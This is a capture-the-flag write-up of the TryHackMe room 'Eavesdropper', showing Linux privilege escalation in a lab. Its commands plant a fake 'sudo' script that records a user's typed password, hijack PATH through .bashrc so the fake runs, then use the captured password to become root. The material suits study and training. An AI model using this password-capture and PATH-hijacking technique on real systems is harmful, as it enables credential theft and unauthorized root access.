---
title: "Eavesdropper"
date: 2025-03-31
image: /assets/img/tryhackme/Eavesdropper/Eavesdropper_image.jpg
description: Writeup of the TryHackMe-CTF Eavesdropper
categories: [TryHackMe, Medium]
tags: [linux, pspy, path, ssh]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Eavesdropper</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Listen closely, you might hear a password!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/eavesdropper">https://tryhackme.com/room/eavesdropper</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Eavesdropper.

## Enumeration

Having already gained initial access, I connected using the private key.:
```bash
kali@kali:~/ctf/eavesdropper$ chmod 600 id-rsa-1647296932800.id-rsa
kali@kali:~/ctf/eavesdropper$ ssh -i id-rsa-1647296932800.id-rsa frank@10.10.196.240
frank@workstation:~$ id
  uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)
```

I started enumeration with several manual checks, such SUID bits, capabilities, cron jobs, and more. After reviewing the most common vectors, I uploaded and executed <a href="https://github.com/DominicBreuker/pspy">pspy</a> which revealed the following output:
```bash
2025/03/31 12:33:48 CMD: UID=1000  PID=12687  | sshd: frank@pts/1    
2025/03/31 12:33:49 CMD: UID=1000  PID=12688  | sshd: frank@pts/1    
2025/03/31 12:33:49 CMD: UID=0     PID=12689  | sudo cat /etc/shadow 
```

## Privilege Escalation frank

Since using `sudo` to cat the `/etc/shadow` file requires the user to enter their sudo password, I could exploit this by creating a file called sudo, which saves the input to a file:
```bash
frank@workstation:~$ echo "#!/bin/bash" > sudo
frank@workstation:~$ echo 'read -p "insert" pwd' >> sudo
frank@workstation:~$ echo 'echo $pwd /home/frank/password' >> sudo
frank@workstation:~$ chmod 777 sudo
```

I manipulated the PATH variable over the `.basrc` file.
```bash
  frank@workstation:~$ nano .bashrc
  # ~/.bashrc: executed by bash(1) for non-login shells.
  # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
  # for examples
  PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
  [...]
```

After relogging and waiting a few seconds, the `password` file was created:
```bash
frank@workstation:~$ ls
  password
frank@workstation:~$ cat password 
  ![removed]*
```

## Privilege Escalation root
I proceeded with `/usr/bin/sudo -l`, referencing the full path, because otherwise, my created `sudo` would be executed:
```bash
frank@workstation:~$ /usr/bin/sudo -l
  [sudo] password for frank: 
  Matching Defaults entries for frank on workstation:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User frank may run the following commands on workstation:
      (ALL : ALL) ALL
```

With this permission, I was able to change my user to root and retrieve the root flag:
```bash
frank@workstation:~$ /usr/bin/sudo su
root@workstation:/home/frank# id
  uid=0(root) gid=0(root) groups=0(root)
root@workstation:/home/frank# cd /root
root@workstation:~# ls
  flag.txt
root@workstation:~# cat flag.txt 
  flag{1[removed]0}
```

solved! :)